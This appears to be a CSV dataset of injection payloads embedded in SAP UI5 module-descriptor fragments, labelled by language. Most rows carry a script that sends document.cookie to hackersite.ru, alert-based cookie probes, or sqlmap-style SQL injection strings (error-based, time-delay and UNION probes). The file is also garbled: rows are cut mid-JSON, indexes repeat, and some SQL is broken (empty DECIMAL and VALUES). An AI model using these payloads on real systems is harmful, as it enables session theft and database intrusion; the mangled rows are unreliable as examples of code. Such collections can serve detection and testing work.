,language,source
18,json,"label\"",\""kind\"":\""text\"",\""key\"":\""<script>var img=new Image();img.src=""http://hackersite.ru/xss.jpg?""+ encodeURI(document.cookie);</script>\""},\""longTitle\"":{\""type\"":\""label\"",\""kind\"":\""text\"",\""key\"":\""longTitleStep-RevenuebyCustomer\"""
19,JS,"},\""thumbnail\"":{\""type\"":\""thumbnail\"",\""leftUpper\"":{\""type\"":\""label\"",\""kind\"":\""<script>var img=new Image();img.src=""http://hackersite.ru/xss.jpg?""+ encodeURI(document.cookie);</script>\"",\"""
20,JS,":\""longTitleStep-RevenuebyCustomeroverTime\""},\""thumbnail\"":{\""type\"":\""<script>var img=new Image();img.src=""http://hackersite.ru/xss.jpg?""+ encodeURI(document.cookie);</script>\"",\""leftUpper\"":{\""type\""0,sql,"<module name=""sap/ui/core/Core.js>id = 1 AND 9533 IN ( SELECT ( CHAR ( 113 ) +CHAR ( 118 ) +CHAR ( 106 ) +CHAR ( 98 ) +CHAR ( 113 ) + ( SELECT ( CASE WHEN ( 9533 = 9533 ) THEN CHAR ( 49 ) ELSE CHAR ( 48 ) END ) ) +CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 120 ) +CHAR ( 113 ) ) ) - - sFCM</module>"""
1,sql,"<module name=""sap/ui/core/library.js"">AND 9940 = DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( 73 ) | | CHR ( 111 ) | | CHR ( 115 ) | | CHR ( 104 ) , 5 ) AND ( 4586 = 4586</module>"""
333,sql,"<module name=""sap/ui/thirdparty/jqueryui/jquery-ui-core.js"" conditional=""true"">CREATE TABLE Salaries( CheckNum INTEGER PRIMARY KEY, Amount DECIMAL(,) NOT NULL ); INSERT INTO Salaries (CheckNum, Amount) VALUES (,), (,), (,), (,), (,), (,), (,), (,); SELECT s.Amount, s.AmountOccurrence FROM( SELECT Amount</module>"""
4,sql,"<module name=""sap/ui/thirdparty/jqueryui/jquery-ui-widget.js"" conditional=""true"">CREATE TABLE Salaries( CheckNum INTEGER PRIMARY KEY, Amount DECIMAL(,) NOT NULL ); INSERT INTO Salaries (CheckNum, Amount) VALUES (,), (,), (,), (,), (,), (,), (,), (,); SELECT s.Amount, s.AmountOccurrence FROM( SELECT Amount</module>"""
5,sql,"<module name=""sap/ui/thirdparty/jqueryui/jquery-ui-mouse.js"" conditional=""true"">INSERT INTO Salasries (CheckNum, Amount) VALUES (,), (,), (,), (,), (,), (,.), (,); SELECT Amount, MOST_FREQUENT FROM(SELECT Amount</module>"""
6,sql,"<module name=""sap/ui/thirdparty/jqueryui/jquery-ui-draggable.js"" conditional=""true"">CREATE TABLE Salaries( CheckNum INTEGER PRIMARY KEY, Amount DECIMAL(,) NOT NULL );</module>"""
7,sql,"<module name=""sap/ui/thirdparty/jqueryui/jquery-ui-droppable.js"" conditional=""true"">INSERT INTO CUSTOMER (customerid,customername) VALUES(,'gamma'); SAVEPOINT s;</module>"""
8,sql,"<module name=""sap/viz/libs/canvg.js"" conditional=""true"">UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL - -</module>"""
9,sql,"<module name=""sap/viz/libs/rgbcolor.js"" conditional=""true"">SELECT 8610 FROM ( SELECT COUNT ( * ) , CONCAT ( 0x71766a6271 , ( SELECT ( ELT ( 8610 = 8610 , 1 ) ) ) , 0x7171717871 , FLOOR ( RAND ( 0 ) *2 ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a )</module>"""
10,sql,"<module name=""sap/viz/libs/sap-viz-info.js"" conditional=""true"">SELECT 8610 FROM ( SELECT COUNT ( * ) , CONCAT ( 0x71766a6271 , ( SELECT ( ELT ( 8610 = 8610 , 1 ) ) ) , 0x7171717871 , FLOOR ( RAND ( 0 ) *2 ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a )</module>"""
11,JS,"<module name=""jquery.sap.global.js""/><script>var img=new Image();img.src=""http://hackersite.ru/xss.jpg?""+ encodeURI(document.cookie);</script>"""
12,JS,"</requires><script>var img=new Image();img.src=""http://hackersite.ru/xss.jpg?""+ encodeURI(document.cookie);</script>"""
13,JS,"<includes><script>var img=new Image();img.src=""http://hackersite.ru/xss.jpg?""+ encodeURI(document.cookie);</script>"""
14,JS,"<module name=""sap/viz/ui5/types/Area_drawingEffect.js""/><script>var img=new Image();img.src=""http://hackersite.ru/xss.jpg?""+ encodeURI(document.cookie);</script>"""
15,JS,"<module name=""sap/viz/ui5/types/Area_marker_shape.js""/><script>alert(«cookie: «+document.cookie)</script>"""
16,JS,"<module name=""sap/viz/ui5/types/Area_mode.js""/><script>alert(«cookie: «+document.cookie)</script>"""
17,JS,"<module name=""sap/viz/ui5/types/Area_orientation.js""/><script>alert(«cookie: «+document.cookie)</script>"""
18,JS,"<module name=""sap/viz/ui5/types/Axis_gridline_type.js""/><script>alert(«cookie: «+document.cookie)</script>"""
19,JS,"<module name=""sap/viz/ui5/types/Axis_label_unitFormatType.js""/><script>alert(«cookie: «+document.cookie)</script>"""
20,JS,"<module name=""sap/viz/ui5/types/Axis_position.js""/><script>alert(«cookie: «+document.cookie)</script>"
